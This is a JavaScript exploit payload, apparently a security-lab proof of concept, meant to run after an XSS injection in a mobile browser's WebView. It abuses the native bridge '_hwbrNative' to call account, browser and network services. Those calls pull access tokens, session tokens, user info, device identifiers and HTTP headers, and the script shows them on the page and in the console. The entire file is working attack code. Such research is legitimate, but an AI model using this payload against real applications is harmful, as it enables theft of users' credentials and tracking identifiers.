try {
  document.body.innerHTML = '<div id="atk" style="font-size:12px;color:red;padding:8px;word-break:break-all;line-height:1.6;"></div>';
  var d = document.getElementById('atk');
  function log(msg) {
    console.log('CLOUDXLAB_ATTACK: ' + msg);
    if (d) { d.innerHTML += msg + '<br>'; }
  }
  log('xss_verify result=success');
  var bn = window._hwbrNative;
  if (!bn) {
    log('no _hwbrNative bridge');
  } else {
    log('bridge found, methods=' + Object.getOwnPropertyNames(bn).join(','));
    var callbacks = {};
    var cbSeq = Math.floor(Math.random() * 100000);
    var msgQueue = [];
    var processing = false;
    function nextTick(fn) { setTimeout(fn); }
    function buildPayload(arr, message) {
      var trans = {
        s: function(m) { return m.slice(1); },
        t: function() { return true; },
        f: function() { return false; },
        N: function() { return null; },
        n: function(m) { return +m.slice(1); },
        A: function(m) { return atob(m.slice(1)); },
        S: function(m) { return window.atob(m.slice(1)); }
      };
      arr.push((trans[message.charAt(0)] || function(m) { return JSON.parse(m); })(message));
    }
    function processMessage(message) {
      var c = message.charAt(0);
      if (c === 'S' || c === 'F') {
        var ok = c === 'S';
        var keep = message.charAt(1) === '1';
        var s1 = message.indexOf(' ', 2);
        var status = +message.slice(2, s1);
        var s2 = message.indexOf(' ', s1 + 1);
        var cbId = message.slice(s1 + 1, s2);
        var pm = message.slice(s2 + 1);
        var payload = [];
        buildPayload(payload, pm);
        if (payload.length === 1) payload = payload[0];
        var cb = callbacks[cbId];
        log('callback cbId=' + cbId + ' ok=' + ok + ' status=' + status + ' data=' + JSON.stringify(payload));
        if (cb) {
          if (ok && status === 1) { cb.s && cb.s(payload); }
          else if (!ok) { cb.f && cb.f(payload, status); }
          if (!keep) { delete callbacks[cbId]; }
        }
      }
    }
    function popMsg() {
      var batch = msgQueue.shift();
      if (batch === '*') return '*';
      var s = batch.indexOf(' ');
      var len = +batch.slice(0, s);
      var msg = batch.substr(s + 1, len);
      batch = batch.slice(s + len + 1);
      if (batch) msgQueue.unshift(batch);
      return msg;
    }
    function processQueue() {
      if (processing || msgQueue.length === 0) return;
      processing = true;
      try { processMessage(popMsg()); }
      finally {
        processing = false;
        if (msgQueue.length > 0) nextTick(processQueue);
      }
    }
    function sync(service, action, args) {
      try {
        var r = bn.invokeSync(service, action, JSON.stringify(args || []));
        log('SYNC ' + service + '.' + action + ' = ' + r);
        return r;
      } catch(e) {
        log('SYNC ' + service + '.' + action + ' ERR=' + e.message);
        return null;
      }
    }
    function async(service, action, args, onOk, onFail) {
      try {
        var cbId = 'a' + (cbSeq++);
        if (onOk || onFail) callbacks[cbId] = { s: onOk, f: onFail };
        var msgs = bn.invoke(service, action, cbId, JSON.stringify(args || []), -1);
        log('ASYNC ' + service + '.' + action + ' cbId=' + cbId + ' rawReturn=' + (msgs ? 'hasMsg' : 'empty'));
        if (msgs) { msgQueue.push(msgs); nextTick(processQueue); }
      } catch(e) {
        log('ASYNC ' + service + '.' + action + ' ERR=' + e.message);
      }
    }
    log('=== app service (strategy=always true) ===');
    async('app', 'getPluginList', [],
      function(r) { log('getPluginList OK=' + JSON.stringify(r)); },
      function(r, s) { log('getPluginList FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('app', 'getPluginApiList', [['account', 'browser', 'network', 'report']],
      function(r) {
        log('getPluginApiList OK=' + JSON.stringify(r));
        try {
          var parsed = typeof r === 'string' ? JSON.parse(r) : r;
          if (parsed && parsed.functions) {
            log('available functions: ' + parsed.functions.join(', '));
          }
        } catch(e) {}
      },
      function(r, s) { log('getPluginApiList FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    log('=== account service (sensitive: AT/ST/userId) ===');
    async('account', 'hasLogin', [],
      function(r) { log('hasLogin OK=' + JSON.stringify(r)); },
      function(r, s) { log('hasLogin FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('account', 'getUserInfo', [],
      function(r) {
        log('getUserInfo OK=' + JSON.stringify(r));
        log('*** SENSITIVE DATA: userId/accessToken/sessionToken ***');
      },
      function(r, s) { log('getUserInfo FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('account', 'refreshAT', [],
      function(r) {
        log('refreshAT OK=' + JSON.stringify(r));
        log('*** SENSITIVE: accessToken returned ***');
      },
      function(r, s) { log('refreshAT FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('account', 'refreshST', ['', '0088020001'],
      function(r) {
        log('refreshST OK=' + JSON.stringify(r));
        log('*** SENSITIVE: sessionToken returned ***');
      },
      function(r, s) { log('refreshST FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('account', 'getNickNameAndAvatar', [],
      function(r) { log('getNickNameAndAvatar OK=' + JSON.stringify(r)); },
      function(r, s) { log('getNickNameAndAvatar FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    log('=== browser service (getClientInfo/getPublicHttpHeader) ===');
    async('browser', 'getClientInfo', [],
      function(r) {
        log('getClientInfo OK=' + JSON.stringify(r));
        log('*** SENSITIVE: device info + HTTP headers (UDID/OAID/ODID) ***');
      },
      function(r, s) { log('getClientInfo FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    async('browser', 'getPublicHttpHeader', [false],
      function(r) {
        log('getPublicHttpHeader OK=' + JSON.stringify(r));
        log('*** SENSITIVE: HTTP headers with device identifiers ***');
      },
      function(r, s) { log('getPublicHttpHeader FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    sync('browser', 'isIncognitoModeSync', []);
    log('=== network service ===');
    async('network', 'getNetworkAvailable', [],
      function(r) { log('getNetworkAvailable OK=' + JSON.stringify(r)); },
      function(r, s) { log('getNetworkAvailable FAIL=' + JSON.stringify(r) + ' s=' + s); }
    );
    sync('network', 'getNetworkAvailableSync', []);
    log('=== done, waiting for callbacks ===');
  }
} catch(e) {
  document.body.innerHTML = '<div style="color:red;font-size:14px;padding:10px;">FATAL: ' + e.message + '</div>';
}
